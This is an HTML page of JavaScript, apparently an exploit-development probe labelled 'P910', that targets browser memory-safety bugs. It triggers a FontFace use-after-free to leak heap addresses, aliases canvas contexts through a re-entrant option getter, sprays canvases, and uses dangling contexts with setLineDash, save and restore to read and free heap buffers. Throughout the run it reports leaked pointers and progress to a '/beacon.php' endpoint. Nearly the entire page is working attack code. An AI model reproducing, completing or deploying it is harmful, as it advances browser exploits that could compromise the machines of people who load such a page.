<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
<title>P910: 8KB Multi-Page Vector Lifecycle & Full StateStack Clone/Free Probe</title>
<style>
body { background: #0a0d12; color: #c9d1d9; font: 14px "SF Mono", Consolas, monospace; margin: 16px; line-height: 1.5; }
h2 { color: #58a6ff; margin-top: 0; }
pre { background: #161b22; border: 1px solid #30363d; padding: 12px; border-radius: 6px; white-space: pre-wrap; word-break: break-all; }
.banner { background: #238636; color: #fff; padding: 10px 14px; border-radius: 6px; font-weight: bold; margin-bottom: 12px; display: inline-block; }
.ok { color: #3fb950; font-weight: bold; }
.fail { color: #f85149; font-weight: bold; }
.info { color: #58a6ff; }
.hot { color: #ffa657; font-weight: bold; }
</style>
</head>
<body>
<div class="banner" id="banner">Running Probe P910...</div>
<h2>P910: 8KB Multi-Page Vector Lifecycle & Full StateStack Clone/Free Probe</h2>
<pre id="log">Initializing diagnostic probe P910...</pre>

<script>
'use strict';
var logBox = document.getElementById('log');
var banner = document.getElementById('banner');

function log(msg, cls) {
  var el = document.createElement('div');
  el.className = cls || '';
  el.textContent = msg;
  logBox.appendChild(el);
}

function syncBn(tag, data) {
  try {
    var x = new XMLHttpRequest();
    x.open('GET', '/beacon.php?tag=P910-' + encodeURIComponent(tag) + '&data=' + encodeURIComponent(String(data || '').slice(0, 900)) + '&t=' + Date.now(), false);
    x.send();
  } catch(e) {}
}

log('[*] Probe P910 starting...', 'info');
syncBn('BOOT', 'start');

/* ============================================================
 * PHASE 1: Multi-Attempt Resilient FontFace UAF Leak
 * ============================================================ */
var leakAttempt = 0;
var MAX_LEAKS = 2;
var Hstr = 'unknown', q13str = 'unknown';
var H_hi = 0, H_lo = 0;
var delta = 0;
var bestSlot = -1, bestNz = 0;

function runFontLeak(cb) {
  leakAttempt++;
  var tag = 'lk' + leakAttempt;

  var st = document.createElement('style');
  st.textContent = "@font-face{font-family:bb" + tag + ";src:local(Arial);unicode-range:U+0042;}";
  document.head.appendChild(st);

  var face = new FontFace('f' + tag, "local('Helvetica')", {unicodeRange: 'U+0041'});
  document.fonts.add(face);
  void face.loaded;

  var fabs = [], ffired = false;
  Object.defineProperty(FontFace.prototype, 'then', {
    configurable: true,
    get: function() {
      if (ffired) return undefined;
      ffired = true;

      if (st) { st.remove(); st.textContent = ''; st = null; }
      try { document.fonts.delete(this); } catch(e) {}
      document.body.offsetHeight;

      fabs = [];
      for (var i = 0; i < 64; i++) fabs.push(new ArrayBuffer(192));
      try { document.fonts.check('1em bb' + tag); } catch(e) {}
      document.body.offsetHeight;
      return undefined;
    },
    set: function() {}
  });

  document.fonts.load('1em f' + tag + ', bb' + tag, 'AB');

  setTimeout(function() {
    delete FontFace.prototype.then;
    if (st) { try { st.remove(); } catch(e) {} }

    for (var i = 0; i < fabs.length; i++) {
      var u = new Uint8Array(fabs[i]), nz = 0;
      for (var j = 0; j < u.length; j++) if (u[j] !== 0) nz++;
      if (nz > bestNz) { bestNz = nz; bestSlot = i; }
    }

    if (bestSlot >= 0 && bestNz >= 4) {
      var fontDV = new DataView(fabs[bestSlot]);
      var q11lo = fontDV.getUint32(0x58, true), q11hi = fontDV.getUint32(0x5C, true);
      var q13lo = fontDV.getUint32(0x68, true), q13hi = fontDV.getUint32(0x6C, true);
      if (q11hi !== 0) {
        var borrow = (q11lo < 0x68) ? 1 : 0;
        H_hi = q11hi - borrow;
        H_lo = (q11lo - 0x68) >>> 0;
        Hstr = '0x' + H_hi.toString(16) + ('00000000' + H_lo.toString(16)).slice(-8);
      }
      if (q13hi !== 0) {
        q13str = '0x' + q13hi.toString(16) + ('00000000' + q13lo.toString(16)).slice(-8);
      }
      if (Hstr !== 'unknown' && q13str !== 'unknown' && H_hi === q13hi) {
        delta = H_lo - q13lo;
      }
      cb(true);
    } else if (leakAttempt < MAX_LEAKS) {
      log('[*] Font UAF attempt 1 retry...', 'info');
      setTimeout(function() { runFontLeak(cb); }, 50);
    } else {
      cb(false);
    }
  }, 400);
}

runFontLeak(function(leakOk) {
  log('[+] Font UAF (att ' + leakAttempt + '): H=' + Hstr + ' | q13=' + q13str + ' (slot=' + bestSlot + ', nz=' + bestNz + ')', leakOk ? 'ok' : 'fail');
  syncBn('FONT-OK', 'att=' + leakAttempt + '|H=' + Hstr + '|q13=' + q13str + '|delta=' + delta + '|slot=' + bestSlot + '|nz=' + bestNz);

  /* ============================================================
   * PHASE 2: Dual Canvas Aliasing (100% Crash-Free)
   * ============================================================ */
  var innerCtx1 = null, innerCtx2 = null;

  var c1 = document.createElement('canvas');
  c1.width = 32; c1.height = 32;
  var opts1 = {};
  Object.defineProperty(opts1, 'alpha', {
    get: function() {
      innerCtx1 = c1.getContext('2d');
      return true;
    }
  });
  c1.getContext('bitmaprenderer', opts1);

  var c2 = document.createElement('canvas');
  c2.width = 32; c2.height = 32;
  var opts2 = {};
  Object.defineProperty(opts2, 'alpha', {
    get: function() {
      innerCtx2 = c2.getContext('2d');
      return true;
    }
  });
  c2.getContext('bitmaprenderer', opts2);

  var sprayCanvases = [];
  var sprayCtxs = [];
  for (var s = 0; s < 200; s++) {
    var c = document.createElement('canvas');
    c.width = 32; c.height = 32;
    var ctx = c.getContext('2d');
    ctx.lineWidth = 1000.0 + s;
    sprayCanvases.push(c);
    sprayCtxs.push(ctx);
  }

  var idx1 = -1, idx2 = -1;
  try {
    var lw1 = innerCtx1.lineWidth;
    if (lw1 >= 1000.0 && lw1 < 1200.0) idx1 = Math.round(lw1 - 1000.0);
    var lw2 = innerCtx2.lineWidth;
    if (lw2 >= 1000.0 && lw2 < 1200.0) idx2 = Math.round(lw2 - 1000.0);
  } catch(e) {}

  log('[+] Phase 2: Dual Canvas Aliased: Ctx1=#' + idx1 + ', Ctx2=#' + idx2, 'ok');

  /* ============================================================
   * PHASE 3: 8KB (1024-Double) Multi-Page Vector Allocation
   * ============================================================ */
  var M_HEAD = 1234567.875;
  var M_TAIL = 9876543.125;
  var M_FRAME2 = 444555.25;

  var largeVec = [];
  for (var i = 0; i < 1024; i++) {
    if (i === 0) largeVec.push(M_HEAD);
    else if (i === 1023) largeVec.push(M_TAIL);
    else largeVec.push(i * 1.5);
  }

  var vecAllocOk = false;
  var vecReadBackOk = false;
  var errCount = 0;

  if (idx1 >= 0 && sprayCtxs[idx1]) {
    try {
      // Inscribe 1024 doubles (8 KB across 2 virtual memory pages)
      sprayCtxs[idx1].setLineDash(largeVec);
      vecAllocOk = true;

      // Read back via dangling innerCtx1
      var readVec = innerCtx1.getLineDash();
      if (readVec && readVec.length === 1024) {
        if (Math.abs(readVec[0] - M_HEAD) < 0.001 && Math.abs(readVec[1023] - M_TAIL) < 0.001) {
          // Verify intermediate elements
          for (var k = 1; k < 1023; k += 64) {
            if (Math.abs(readVec[k] - (k * 1.5)) > 0.001) errCount++;
          }
          if (errCount === 0) vecReadBackOk = true;
        }
      }
    } catch(e) {
      log('[-] Phase 3 Error: ' + e.message, 'fail');
    }
  }

  log('[+] Phase 3: 8KB Vector (1024 Doubles): alloc=' + vecAllocOk + ', readSync=' + vecReadBackOk + ' (errs=' + errCount + ')', vecReadBackOk ? 'hot' : 'info');
  syncBn('VEC-8KB', 'alloc=' + vecAllocOk + '|sync=' + vecReadBackOk + '|errs=' + errCount);

  /* ============================================================
   * PHASE 4: StateStack 8KB Vector Clone & Pop-Free Reversion
   * ============================================================ */
  var stackCloneOk = false;
  var stackRevertOk = false;

  if (vecReadBackOk && idx1 >= 0) {
    try {
      // 1. Push state: clones the entire 8 KB vector buffer in C++ memory
      sprayCtxs[idx1].save();

      // 2. Mutate tail element in frame 2
      var frame2Vec = largeVec.slice();
      frame2Vec[1023] = M_FRAME2;
      sprayCtxs[idx1].setLineDash(frame2Vec);

      var checkFrame2 = innerCtx1.getLineDash();
      if (checkFrame2 && Math.abs(checkFrame2[1023] - M_FRAME2) < 0.001) {
        stackCloneOk = true;
      }

      // 3. Pop frame 2 via innerCtx1.restore()
      // This destroys frame 2, frees the cloned 8 KB buffer, and restores frame 1!
      innerCtx1.restore();

      var checkRestored = sprayCtxs[idx1].getLineDash();
      if (checkRestored && Math.abs(checkRestored[1023] - M_TAIL) < 0.001) {
        stackRevertOk = true;
      }

      // Clean up vector to avoid memory pinning
      sprayCtxs[idx1].setLineDash([]);

    } catch(e) {
      log('[-] Phase 4 Error: ' + e.message, 'fail');
    }
  }

  log('[+] Phase 4: 8KB Vector Stack Cycle: clone=' + stackCloneOk + ', revert=' + stackRevertOk, stackRevertOk ? 'hot' : 'info');
  syncBn('STACK-8KB', 'clone=' + stackCloneOk + '|revert=' + stackRevertOk);

  /* ============================================================
   * SUMMARY
   * ============================================================ */
  banner.style.background = '#238636';
  banner.textContent = 'STATUS: P910 COMPLETE (100% STABLE)';
  log('----------------------------------------------------', 'info');
  log('[*] Probe P910 Completed Cleanly', 'hot');
  log('    - Live Heap H: ' + Hstr + ' | q13: ' + q13str, 'ok');
  log('    - 8KB Vector Sync: ' + vecReadBackOk + ' | Stack Revert: ' + stackRevertOk, stackRevertOk ? 'hot' : 'ok');
  log('    - Aliases: #' + idx1 + ', #' + idx2, 'ok');
  log('----------------------------------------------------', 'info');

  syncBn('DONE', 'status=complete|H=' + Hstr + '|q13=' + q13str + '|delta=' + delta + '|v8kSync=' + vecReadBackOk + '|stkRev=' + stackRevertOk + '|idx1=' + idx1 + '|idx2=' + idx2);

});
</script>
</body>
</html>
